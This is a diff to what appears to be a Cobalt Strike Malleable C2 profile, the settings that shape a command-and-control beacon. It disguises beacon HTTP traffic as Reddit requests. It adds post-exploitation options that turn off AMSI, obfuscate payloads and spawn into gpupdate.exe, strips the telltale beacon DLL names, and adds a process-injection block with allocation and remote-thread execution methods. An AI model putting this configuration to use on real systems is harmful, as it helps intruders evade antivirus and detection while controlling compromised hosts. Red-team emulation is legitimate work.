@@ -9,6 +9,21 @@ set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Geck
 set dns_idle "8.8.8.8";
 set maxdns    "235";
 
+#custom cert
+#https-certificate {
+#    set keystore "your_store_file.store";
+#    set password "your_store_pass";
+#}
+
+http-config {
+#    set headers "Server, Content-Type, Cache-Control, Connection";
+#    header "Content-Type" "text/html;charset=UTF-8";
+#    header "Connection" "close";
+#    header "Cache-Control" "max-age=2";
+#    header "Server" "nginx";
+    #set "true" if teamserver is behind redirector
+    set trust_x_forwarded_for "false";
+}
 
 http-get {
 
@@ -16,7 +31,7 @@ http-get {
     
     client {
 
-	header "Host" "www.reddit.com";
+        header "Host" "www.reddit.com";
 	header "Accept" "*/*";
 	header "Accept-Language" "en-US";
 	header "Connection" "close";
@@ -56,7 +71,7 @@ http-get {
 
 http-post {
     
-    set uri "/r/webdev/comments/95ltyr/slow_loading_of_google";
+    set uri "/r/webdev/comments/95lyr/slow_loading_of_google";
     set verb "GET";
 
     client {
@@ -129,8 +144,18 @@ http-stager {
 
 ###Malleable PE Options###
 
-set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
-set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
+post-ex {
+
+    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
+    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
+
+    set obfuscate "true";
+
+    set smartinject "true";
+
+    set amsi_disable "true";
+
+}
 
 #used peclone on wwanmm.dll. 
 #don't use 'set image_size_xx' if using 'set module_xx'
@@ -156,11 +181,36 @@ stage {
 
 	transform-x86 {
 	    strrep "ReflectiveLoader" "";
-	    strrep "beacon.dll" "winsku.dll";
+	    strrep "beacon.dll" "";
 	}
 
 	transform-x64 {
 	    strrep "ReflectiveLoader" "";
-	    strrep "beacon.64.dll" "winsockhc.dll";
+	    strrep "beacon.x64.dll" "";
 	}
+}
+process-inject {
+
+    set allocator "NtMapViewOfSection";		
+
+    set min_alloc "16700";
+
+    set userwx "false";  
+    
+    set startrwx "true";
+        
+    transform-x86 {
+        prepend "\x90\x90\x90";
+    }
+    transform-x64 {
+        prepend "\x90\x90\x90";
+    }
+
+    execute {
+        CreateThread "ntdll!RtlUserThreadStart";
+        CreateThread;
+        NtQueueApcThread;
+        CreateRemoteThread;
+        RtlCreateUserThread;
+    }
 }
